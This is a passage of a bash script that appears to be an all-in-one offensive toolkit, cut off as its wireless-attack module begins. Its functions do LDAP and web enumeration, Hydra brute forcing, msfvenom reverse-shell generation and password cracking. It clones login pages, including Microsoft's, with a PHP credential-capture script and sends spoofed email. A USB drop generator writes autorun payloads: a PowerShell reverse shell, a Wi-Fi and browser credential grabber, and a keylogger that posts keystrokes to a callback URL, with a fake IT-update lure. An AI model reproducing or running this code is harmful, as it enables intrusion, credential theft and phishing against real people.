    case $ldap_choice in
        1)
            echo -e "${YELLOW}[*] Attempting anonymous LDAP bind...${NC}"
            local results=$(ldapsearch -x -H "ldap://$dc_ip" -b "dc=${domain//./,dc=}" 2>&1)
            echo "$results"
            save_results_prompt "$results" "ldap_anon_$timestamp.txt" "enumeration"
            ;;
        2)
            echo -n "Enter username: "
            read ldap_user
            echo -n "Enter password: "
            read -s ldap_pass
            echo ""
            local results=$(ldapsearch -x -H "ldap://$dc_ip" -D "$ldap_user@$domain" -w "$ldap_pass" -b "dc=${domain//./,dc=}" 2>&1)
            echo "$results"
            save_results_prompt "$results" "ldap_auth_$timestamp.txt" "enumeration"
            ;;
        3)
            echo -e "${YELLOW}[*] Running user enumeration...${NC}"
            if [[ -f "$WORDLISTS_DIR/seclists/Usernames/Names/names.txt" ]]; then
                local results=$(for user in $(head -100 "$WORDLISTS_DIR/seclists/Usernames/Names/names.txt"); do
                    ldapsearch -x -H "ldap://$dc_ip" -b "dc=${domain//./,dc=}" "(cn=$user)" 2>&1 | grep -q "numEntries" && echo "[+] User found: $user"
                done)
                echo "$results"
                save_results_prompt "$results" "ldap_users_$timestamp.txt" "enumeration"
            else
                echo -e "${RED}[!] Username wordlist not found${NC}"
            fi
            ;;
        4)
            check_install bloodhound.py
            echo -e "${YELLOW}[*] Collecting BloodHound data...${NC}"
            local blood_dir="$RESULTS_DIR/enumeration/bloodhound_$timestamp"
            create_dir "$blood_dir"
            echo -n "Enter username (optional, press Enter for anonymous): "
            read bh_user
            if [[ -n "$bh_user" ]]; then
                echo -n "Enter password: "
                read -s bh_pass
                echo ""
                bloodhound-python -d "$domain" -u "$bh_user" -p "$bh_pass" -dc "$dc_ip" -c All -o "$blood_dir"
            else
                bloodhound-python -d "$domain" -dc "$dc_ip" -c All -o "$blood_dir" --no-pass
            fi
            echo -e "${GREEN}[+] BloodHound data saved to: $blood_dir${NC}"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# Web enumeration with directory brute forcing
web_enum() {
    check_install gobuster
    check_install nikto
    echo -e "${BLUE}[*] Web Enumeration Module${NC}"
    echo -n "Enter target URL (e.g., http://target.com): "
    read target
    
    [[ -z "$target" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_dir="$RESULTS_DIR/enumeration/web_$timestamp"
    
    echo -n "Auto-save results? (y/n): "
    read auto_save
    
    if [[ "$auto_save" == "y" ]]; then
        create_dir "$output_dir"
        
        echo -e "${YELLOW}[*] Running directory brute force...${NC}"
        if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
            gobuster dir -u "$target" -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
                -o "$output_dir/directories.txt" -t 50
        else
            gobuster dir -u "$target" -w "/usr/share/wordlists/dirb/common.txt" \
                -o "$output_dir/directories.txt" -t 50
        fi
        
        echo -e "${YELLOW}[*] Running Nikto scan...${NC}"
        nikto -h "$target" -o "$output_dir/nikto.txt"
        
        echo -e "${GREEN}[+] Results saved to: $output_dir${NC}"
    else
        echo -e "${YELLOW}[*] Running directory brute force...${NC}"
        local gobuster_results=$(gobuster dir -u "$target" -w "/usr/share/wordlists/dirb/common.txt" -t 50 2>&1)
        echo "$gobuster_results"
        
        echo ""
        echo -e "${YELLOW}[*] Running Nikto scan...${NC}"
        local nikto_results=$(nikto -h "$target" 2>&1)
        echo "$nikto_results"
        
        local combined_results="=== GOBUSTER RESULTS ===\n$gobuster_results\n\n=== NIKTO RESULTS ===\n$nikto_results"
        save_results_prompt "$combined_results" "web_enum_$timestamp.txt" "enumeration"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Subdomain enumeration
subdomain_enum() {
    echo -e "${BLUE}[*] Subdomain Enumeration Module${NC}"
    echo -n "Enter target domain (e.g., example.com): "
    read domain
    
    [[ -z "$domain" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo ""
    echo -e "${CYAN}=== ENUMERATION METHODS ===${NC}"
    echo "1) DNS brute force"
    echo "2) Certificate transparency logs"
    echo "3) DNS zone transfer attempt"
    echo "4) All methods"
    echo "0) Back to main menu"
    echo -n "Select method: "
    read method
    
    [[ "$method" == "0" ]] && return
    
    local all_results=""
    
    case $method in
        1)
            echo -e "${YELLOW}[*] Running DNS brute force...${NC}"
            if [[ -f "$WORDLISTS_DIR/seclists/Discovery/DNS/subdomains-top1million-5000.txt" ]]; then
                while read sub; do
                    host "$sub.$domain" 2>/dev/null | grep "has address" &
                done < "$WORDLISTS_DIR/seclists/Discovery/DNS/subdomains-top1million-5000.txt" | head -50
                wait
            else
                for sub in www mail ftp admin portal api dev test staging; do
                    host "$sub.$domain" 2>/dev/null | grep "has address" &
                done
                wait
            fi
            ;;
        2)
            echo -e "${YELLOW}[*] Querying certificate transparency logs...${NC}"
            curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
                jq -r '.[].name_value' 2>/dev/null | sort -u | \
                grep -E "^[a-zA-Z0-9]" || echo -e "${YELLOW}[!] crt.sh query failed or jq not installed${NC}"
            ;;
        3)
            echo -e "${YELLOW}[*] Attempting zone transfer...${NC}"
            for ns in $(host -t ns "$domain" 2>/dev/null | awk '{print $4}'); do
                echo "Trying NS: $ns"
                host -l "$domain" "$ns" 2>&1 | head -20
            done
            ;;
        4)
            echo -e "${YELLOW}[*] Running all enumeration methods...${NC}"
            
            # DNS brute force
            all_results+="=== DNS BRUTE FORCE ===\n"
            for sub in www mail ftp admin portal api dev test staging shop blog; do
                local result=$(host "$sub.$domain" 2>/dev/null | grep "has address")
                [[ -n "$result" ]] && all_results+="$result\n"
            done
            
            # Certificate transparency
            all_results+="\n=== CERTIFICATE TRANSPARENCY ===\n"
            local ct_results=$(curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
                jq -r '.[].name_value' 2>/dev/null | sort -u | head -20)
            all_results+="${ct_results:-Query failed}\n"
            
            echo -e "$all_results"
            save_results_prompt "$all_results" "subdomains_$domain_$timestamp.txt" "enumeration"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# BRUTE FORCE & PASSWORD ATTACKS
# =============================================================================

# Multi-protocol brute force with Hydra
brute_force() {
    check_install hydra
    echo -e "${BLUE}[*] Brute Force Module${NC}"
    echo "Select service:"
    echo "1) SSH"
    echo "2) FTP"
    echo "3) SMB"
    echo "4) HTTP Basic Auth"
    echo "5) HTTP Form POST"
    echo "6) RDP"
    echo "7) VNC"
    echo "8) Telnet"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read choice
    
    [[ "$choice" == "0" ]] && return
    
    echo -n "Enter target IP: "
    read target
    [[ -z "$target" ]] && return
    
    echo -n "Enter username (or 'userlist.txt' for list): "
    read user
    echo -n "Use rockyou.txt wordlist? (y/n): "
    read use_rockyou
    
    if [[ "$use_rockyou" == "y" ]]; then
        wordlist="$WORDLISTS_DIR/rockyou.txt"
    else
        echo -n "Enter wordlist path: "
        read wordlist
    fi
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -n "Save brute force output? (y/n): "
    read save_output
    
    local output_file=""
    [[ "$save_output" == "y" ]] && output_file="$RESULTS_DIR/bruteforce/hydra_${target}_$timestamp.txt"
    
    case $choice in
        1)
            service="ssh"
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" "$service" -t 4 -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" "$service" -t 4
            fi
            ;;
        2)
            service="ftp"
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" "$service" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" "$service"
            fi
            ;;
        3)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" smb -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" smb
            fi
            ;;
        4)
            echo -n "Enter URL path (e.g., /admin): "
            read path
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" http-get "$path" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" http-get "$path"
            fi
            ;;
        5)
            echo -n "Enter form path (e.g., /login.php): "
            read path
            echo -n "Enter username field name: "
            read user_field
            echo -n "Enter password field name: "
            read pass_field
            echo -n "Enter failure message (e.g., 'Invalid'): "
            read fail_msg
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" "$target" http-post-form "$path:$user_field=^USER^&$pass_field=^PASS^:$fail_msg" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" "$target" http-post-form "$path:$user_field=^USER^&$pass_field=^PASS^:$fail_msg"
            fi
            ;;
        6)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" rdp://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" rdp://"$target"
            fi
            ;;
        7)
            if [[ -n "$output_file" ]]; then
                hydra -P "$wordlist" vnc://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -P "$wordlist" vnc://"$target"
            fi
            ;;
        8)
            if [[ -n "$output_file" ]]; then
                hydra -l "$user" -P "$wordlist" telnet://"$target" -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hydra -l "$user" -P "$wordlist" telnet://"$target"
            fi
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PAYLOADS & EXPLOITATION
# =============================================================================

# Metasploit payload generator
payload_gen() {
    check_install metasploit-framework msfvenom
    echo -e "${BLUE}[*] Payload Generator (msfvenom)${NC}"
    echo "Select payload type:"
    echo "1) Linux x86 Reverse Shell"
    echo "2) Linux x64 Reverse Shell"
    echo "3) Windows Reverse Shell"
    echo "4) Windows Meterpreter (Staged)"
    echo "5) Windows Meterpreter (Stageless)"
    echo "6) macOS Reverse Shell"
    echo "7) Python Reverse Shell"
    echo "8) PHP Reverse Shell"
    echo "9) ASP.NET Reverse Shell"
    echo "10) Android APK"
    echo "11) Custom"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read choice
    
    [[ "$choice" == "0" ]] && return
    
    echo -n "Enter LHOST (your IP): "
    read lhost
    [[ -z "$lhost" ]] && return
    
    echo -n "Enter LPORT: "
    read lport
    echo -n "Enter output filename: "
    read filename
    
    [[ -z "$filename" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_path="$TROJANS_DIR/${timestamp}_$filename"
    
    case $choice in
        1)
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output_path"
            ;;
        2)
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output_path"
            ;;
        3)
            msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
            ;;
        4)
            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
            ;;
        5)
            msfvenom -p windows/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output_path"
            ;;
        6)
            msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho -o "$output_path"
            ;;
        7)
            msfvenom -p cmd/unix/reverse_python LHOST="$lhost" LPORT="$lport" -o "$output_path"
            ;;
        8)
            msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$output_path"
            ;;
        9)
            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f aspx -o "$output_path"
            ;;
        10)
            msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output_path"
            ;;
        11)
            echo -n "Enter msfvenom payload name: "
            read payload
            echo -n "Enter format (elf/exe/python/psh/macho/raw): "
            read format
            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$output_path"
            ;;
    esac
    
    if [[ -f "$output_path" ]]; then
        echo -e "${GREEN}[+] Payload saved to: $output_path${NC}"
        echo -e "${YELLOW}[*] To start a listener, run this in another terminal:${NC}"
        echo -e "${RED}msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD <payload>; set LHOST $lhost; set LPORT $lport; exploit\"${NC}"
    else
        echo -e "${RED}[!] Payload generation may have failed${NC}"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Exploit search and information
exploit_search() {
    check_install metasploit-framework searchsploit
    echo -e "${BLUE}[*] Exploit Database Search${NC}"
    echo -n "Enter search term (service/version): "
    read term
    
    [[ -z "$term" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -n "Save search results? (y/n): "
    read save_results
    
    if [[ "$save_results" == "y" ]]; then
        local output_file="$RESULTS_DIR/exploitation/searchsploit_$timestamp.txt"
        searchsploit "$term" | tee "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    else
        searchsploit "$term"
    fi
    
    echo -n "View details of exploit? (enter ID or n): "
    read exploit_id
    if [[ "$exploit_id" != "n" && "$exploit_id" != "N" ]]; then
        searchsploit -x "$exploit_id"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PASSWORD CRACKING
# =============================================================================

# Hash cracking with John or Hashcat
password_crack() {
    echo -e "${BLUE}[*] Password Cracking Module${NC}"
    echo "1) John the Ripper"
    echo "2) Hashcat"
    echo "3) Identify hash type"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read choice
    
    [[ "$choice" == "0" ]] && return
    
    echo -n "Enter hash file path: "
    read hashfile
    
    [[ -z "$hashfile" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -n "Save cracking output? (y/n): "
    read save_output
    
    local output_file=""
    [[ "$save_output" == "y" ]] && output_file="$RESULTS_DIR/cracking/crack_$timestamp.txt"
    
    case $choice in
        1)
            check_install john
            echo -n "Enter hash format (or 'auto'): "
            read format
            
            if [[ -n "$output_file" ]]; then
                if [[ "$format" == "auto" ]]; then
                    john "$hashfile" 2>&1 | tee "$output_file"
                else
                    john --format="$format" "$hashfile" 2>&1 | tee "$output_file"
                fi
                john --show "$hashfile" | tee -a "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                if [[ "$format" == "auto" ]]; then
                    john "$hashfile"
                else
                    john --format="$format" "$hashfile"
                fi
                john --show "$hashfile"
            fi
            ;;
        2)
            check_install hashcat
            echo -n "Enter hash mode number (0 for MD5, 100 for SHA1, etc): "
            read mode
            
            if [[ -n "$output_file" ]]; then
                hashcat -m "$mode" "$hashfile" "$WORDLISTS_DIR/rockyou.txt" --force -o "$output_file"
                echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
            else
                hashcat -m "$mode" "$hashfile" "$WORDLISTS_DIR/rockyou.txt" --force
            fi
            ;;
        3)
            echo -e "${YELLOW}[*] Analyzing hash format...${NC}"
            john --show=formats "$hashfile" 2>/dev/null || \
            hashid "$hashfile" 2>/dev/null || \
            echo "Common formats to try: 0=MD5, 100=SHA1, 1000=NTLM, 5500=NetNTLMv1, 5600=NetNTLMv2"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# PHISHING TOOLS MODULE
# =============================================================================

# Phishing campaign manager
phishing_menu() {
    while true; do
        echo -e "${CYAN}"
        cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║              PHISHING & SOCIAL ENGINEERING                ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
        echo -e "${NC}"
        
        echo "1) Clone Website (Credential Harvester)"
        echo "2) Create Custom Phishing Page"
        echo "3) Email Spoofing/Sender"
        echo "4) View Captured Credentials"
        echo "5) Generate QR Code Phish"
        echo "6) USB Drop Attack Generator"
        echo "0) Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read phish_choice
        
        case $phish_choice in
            1) clone_website ;;
            2) custom_phish_page ;;
            3) email_spoofer ;;
            4) view_captured_creds ;;
            5) qr_code_phish ;;
            6) usb_drop_generator ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# Website cloning for credential harvesting
clone_website() {
    check_install httrack
    echo -e "${BLUE}[*] Website Cloning Tool${NC}"
    echo -n "Enter target URL to clone (e.g., https://login.microsoftonline.com): "
    read target_url
    
    [[ -z "$target_url" ]] && return
    
    echo -n "Enter local port for harvester (default 8080): "
    read harvest_port
    harvest_port=${harvest_port:-8080}
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local clone_dir="$PHISHING_DIR/cloned_site_$timestamp"
    create_dir "$clone_dir"
    
    echo -e "${YELLOW}[*] Cloning website... This may take a moment.${NC}"
    httrack "$target_url" -O "$clone_dir" -v --quiet | tail -20
    
    # Find and modify login form to capture credentials
    local login_file=$(find "$clone_dir" -name "*.html" -exec grep -l "password\|login\|signin" {} \; 2>/dev/null | head -1)
    
    if [[ -n "$login_file" ]]; then
        echo -e "${GREEN}[+] Found potential login page: $login_file${NC}"
        echo -n "Modify form to capture credentials? (y/n): "
        read modify_form
        
        if [[ "$modify_form" == "y" ]]; then
            # Create PHP capture script
            cat > "$clone_dir/capture.php" << 'PHPEOF'
<?php
$timestamp = date('Y-m-d H:i:s');
$data = "[$timestamp] ";
foreach($_POST as $key => $value) {
    $data .= "$key=$value; ";
}
$data .= "IP=".$_SERVER['REMOTE_ADDR']."\n";
file_put_contents('captured_creds.txt', $data, FILE_APPEND);
header('Location: https://login.microsoftonline.com'); // Redirect to real site
?>
PHPEOF
            
            # Modify HTML form to POST to capture.php
            sed -i 's/<form[^>]*>/<form action="capture.php" method="POST">/i' "$login_file"
            sed -i 's/https:\/\/login.microsoftonline.com/\./g' "$login_file" 2>/dev/null || true
            
            echo -e "${GREEN}[+] Form modified to capture credentials${NC}"
        fi
    fi
    
    echo -e "${YELLOW}[*] Starting PHP server on port $harvest_port...${NC}"
    echo -e "${CYAN}Access the cloned site at: http://$(hostname -I | awk '{print $1}'):$harvest_port${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop the server${NC}"
    echo ""
    
    cd "$clone_dir" && php -S "0.0.0.0:$harvest_port" 2>&1 | while read line; do
        echo "$line"
        # Check for captured credentials
        if [[ -f "$clone_dir/captured_creds.txt" ]]; then
            local new_creds=$(tail -1 "$clone_dir/captured_creds.txt")
            echo -e "${RED}[!] CAPTURED: $new_creds${NC}"
            cp "$clone_dir/captured_creds.txt" "$CREDS_DIR/creds_$timestamp.txt"
        fi
    done
}

# Custom phishing page generator
custom_phish_page() {
    echo -e "${BLUE}[*] Custom Phishing Page Generator${NC}"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local template_dir="$PHISHING_DIR/templates/custom_$timestamp"
    create_dir "$template_dir"
    
    echo "Select template type:"
    echo "1) Corporate Login"
    echo "2) Social Media Login"
    echo "3) Banking Login"
    echo "4) Email Login"
    echo "5) Custom HTML"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read template_choice
    
    [[ "$template_choice" == "0" ]] && return
    
    case $template_choice in
        1) template_name="Corporate Portal" ;;
        2) template_name="Social Media" ;;
        3) template_name="Banking" ;;
        4) template_name="Email Login" ;;
        5) template_name="Custom" ;;
    esac
    
    echo -n "Enter page title: "
    read page_title
    echo -n "Enter company/logo name: "
    read company_name
    echo -n "Enter redirect URL (after capture): "
    read redirect_url
    
    # Generate HTML
    cat > "$template_dir/index.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>$page_title</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
        .logo { text-align: center; font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #106ebe; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">$company_name</div>
        <form action="capture.php" method="POST">
            <input type="text" name="username" placeholder="Username/Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
EOF

    # Create capture script
    cat > "$template_dir/capture.php" << EOF
<?php
\$timestamp = date('Y-m-d H:i:s');
\$data = "[\$timestamp] ";
foreach(\$_POST as \$key => \$value) {
    \$data .= "\$key=\$value; ";
}
\$data .= "IP=".\$_SERVER['REMOTE_ADDR']."\\n";
file_put_contents('captured_creds.txt', \$data, FILE_APPEND);
header('Location: $redirect_url');
?>
EOF

    echo -n "Enter port to serve on (default 8080): "
    read serve_port
    serve_port=${serve_port:-8080}
    
    echo -e "${GREEN}[+] Phishing page created in: $template_dir${NC}"
    echo -e "${YELLOW}[*] Starting server...${NC}"
    echo -e "${CYAN}Access at: http://$(hostname -I | awk '{print $1}'):$serve_port${NC}"
    
    cd "$template_dir" && php -S "0.0.0.0:$serve_port"
}

# Email spoofing tool
email_spoofer() {
    check_install sendemail
    echo -e "${BLUE}[*] Email Spoofing/Sending Tool${NC}"
    echo -e "${RED}[!] WARNING: Only use for authorized testing!${NC}"
    echo ""
    
    echo -n "SMTP server (IP:port): "
    read smtp_server
    [[ -z "$smtp_server" ]] && return
    
    echo -n "From address (can be spoofed): "
    read from_addr
    echo -n "To address: "
    read to_addr
    echo -n "Subject: "
    read subject
    echo -n "Message body (or path to HTML file): "
    read body
    
    # Check if body is a file
    if [[ -f "$body" ]]; then
        body_arg="-o message-file=\"$body\""
    else
        body_arg="-u \"$body\""
    fi
    
    echo -n "Attachment file (optional, press Enter to skip): "
    read attachment
    [[ -n "$attachment" ]] && attach_arg="-a \"$attachment\"" || attach_arg=""
    
    echo -n "Use TLS/SSL? (y/n): "
    read use_tls
    [[ "$use_tls" == "y" ]] && tls_arg="-tls=yes" || tls_arg=""
    
    echo -e "${YELLOW}[*] Sending email...${NC}"
    sendemail -f "$from_addr" -t "$to_addr" -u "$subject" $body_arg -s "$smtp_server" $tls_arg $attach_arg -v
    
    echo -n "Press Enter to continue..."
    read
}

# View captured credentials
view_captured_creds() {
    echo -e "${BLUE}[*] Captured Credentials Database${NC}"
    echo ""
    
    # List all captured credential files
    local cred_files=()
    for f in "$CREDS_DIR"/*.txt "$PHISHING_DIR"/captured_*.txt "$PHISHING_DIR"/*/captured_creds.txt; do
        [[ -f "$f" ]] && cred_files+=("$f")
    done 2>/dev/null    
    
    if [[ ${#cred_files[@]} -eq 0 ]]; then
        echo -e "${YELLOW}[!] No captured credentials found${NC}"
    else
        echo -e "${GREEN}[+] Found credential files:${NC}"
        local i=1
        for file in "${cred_files[@]}"; do
            [[ -f "$file" ]] && echo "  $i) $file ($(wc -l < "$file") entries)"
            ((i++))
        done
        
        echo ""
        echo -n "View file number (or 'all'): "
        read view_choice
        
        if [[ "$view_choice" == "all" ]]; then
            for file in "${cred_files[@]}"; do
                [[ -f "$file" ]] && echo -e "\n=== $file ===" && cat "$file"
            done
        else
            local selected="${cred_files[$((view_choice-1))]}"
            [[ -f "$selected" ]] && cat "$selected"
        fi
    fi
    
    echo ""
    echo -n "Export to single file? (y/n): "
    read export_creds
    if [[ "$export_creds" == "y" ]]; then
        local export_file="$CREDS_DIR/all_creds_$(date +%Y%m%d).txt"
        cat "${cred_files[@]}" 2>/dev/null > "$export_file"
        echo -e "${GREEN}[+] Exported to: $export_file${NC}"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# QR Code phishing generator
qr_code_phish() {
    echo -e "${BLUE}[*] QR Code Phishing Generator${NC}"
    echo -n "Enter malicious URL: "
    read malicious_url
    
    [[ -z "$malicious_url" ]] && return
    
    echo -n "Output filename (without extension): "
    read qr_filename
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    # Check for qrencode or use Python
    if command -v qrencode &>/dev/null; then
        qrencode -o "$PHISHING_DIR/${qr_filename}.png" "$malicious_url"
        echo -e "${GREEN}[+] QR Code saved to: $PHISHING_DIR/${qr_filename}.png${NC}"
    else
        python3 -c "
import qrcode
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data('$malicious_url')
qr.make(fit=True)
img = qr.make_image(fill_color='black', back_color='white')
img.save('$PHISHING_DIR/${qr_filename}.png')
" 2>/dev/null && echo -e "${GREEN}[+] QR Code saved to: $PHISHING_DIR/${qr_filename}.png${NC}" || \
        echo -e "${RED}[!] Install qrencode or python3-qrcode${NC}"
    fi
    
    echo -e "${YELLOW}[*] QR Code points to: $malicious_url${NC}"
    echo -n "Press Enter to continue..."
    read
}

# USB drop attack generator
usb_drop_generator() {
    echo -e "${BLUE}[*] USB Drop Attack Generator${NC}"
    echo -e "${YELLOW}[*] Creates autorun payloads for USB devices${NC}"
    echo ""
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local usb_dir="$PHISHING_DIR/usb_payloads_$timestamp"
    create_dir "$usb_dir"
    
    echo "Select payload type:"
    echo "1) Reverse shell (PowerShell)"
    echo "2) Credential harvester"
    echo "3) Keylogger dropper"
    echo "4) Custom batch script"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read usb_choice
    
    [[ "$usb_choice" == "0" ]] && return
    
    case $usb_choice in
        1)
            echo -n "Enter LHOST: "
            read lhost
            [[ -z "$lhost" ]] && return
            echo -n "Enter LPORT: "
            read lport
            
            cat > "$usb_dir/autorun.bat" << EOF
@echo off
powershell -WindowStyle Hidden -Command "\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
EOF
            ;;
        2)
            cat > "$usb_dir/autorun.bat" << 'EOF'
@echo off
powershell -Command "netsh wlan show profile * key=clear | Out-File %TEMP%\wifi_creds.txt; (Get-Content $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data -ErrorAction SilentlyContinue | Out-File %TEMP%\chrome_creds.txt -Append); copy %TEMP%\wifi_creds.txt %CD%\captured\ 2>nul"
EOF
            create_dir "$usb_dir/captured"
            ;;
        3)
            echo -n "Enter callback URL for logs: "
            read callback_url
            [[ -z "$callback_url" ]] && return
            cat > "$usb_dir/autorun.bat" << EOF
@echo off
powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; \$keys = ''; while(\$true){ Start-Sleep -m 10; for(\$i=1; \$i -le 254; \$i++){\$key = [System.Windows.Forms.SendKeys]::GetAsyncKeyState(\$i); if(\$key -eq -32767){\$keys += [char]\$i; if(\$keys.Length -gt 100){ Invoke-WebRequest -Uri '$callback_url' -Method POST -Body \$keys; \$keys = ''}}}}"
EOF
            ;;
        4)
            echo -n "Enter path to custom batch file: "
            read custom_batch
            [[ -f "$custom_batch" ]] && cp "$custom_batch" "$usb_dir/autorun.bat"
            ;;
    esac
    
    # Create autorun.inf for older Windows systems
    cat > "$usb_dir/autorun.inf" << EOF
[AutoRun]
Open=autorun.bat
Action=Open folder to view files
Label=USB Drive
Icon=%SystemRoot%\system32\SHELL32.dll,4
EOF

    # Create README for social engineering
    cat > "$usb_dir/README.txt" << EOF
IMPORTANT - Corporate Security Update

Please run the security update from this drive to ensure your system is protected.

Contact IT Support for assistance.
EOF

    echo -e "${GREEN}[+] USB payload created in: $usb_dir${NC}"
    echo -e "${YELLOW}[!] Copy contents to USB root. Disable antivirus on target.${NC}"
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# WIRELESS ATTACKS MODULE
# =============================================================================

# WiFi network scanner and attack suite
wifi_attacks() {
    check_install aircrack-ng
    check_install macchanger
    check_install wireless-tools
    
    while true; do
        echo -e "${CYAN}"
        cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║              WIRELESS ATTACKS MODULE                      ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
        echo -e "${NC}"
        
        echo "1) Scan for wireless networks"
        echo "2) Capture WPA/WPA2 handshake"
        echo "3) Crack WPA/WPA2 handshake"
        echo "4) WPS PIN attack (Reaver)"
        echo "5) Deauth attack"
        echo "6) Create fake access point (Evil Twin)"
        echo "7) Monitor mode management"
        echo "8) WiFi Brute Forcer (WPA/WPA2)"
        echo "0) Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read wifi_choice
        
        case $wifi_choice in
            1) wifi_scan ;;
            2) capture_handshake ;;
            3) crack_handshake ;;
            4) wps_attack ;;
            5) deauth_attack ;;
            6) evil_twin ;;
            7) monitor_mode_menu ;;
            8) wifi_brute_forcer ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# Scan for wireless networks
wifi_scan() {
    echo -e "${BLUE}[*] Wireless Network Scanner${NC}"
    
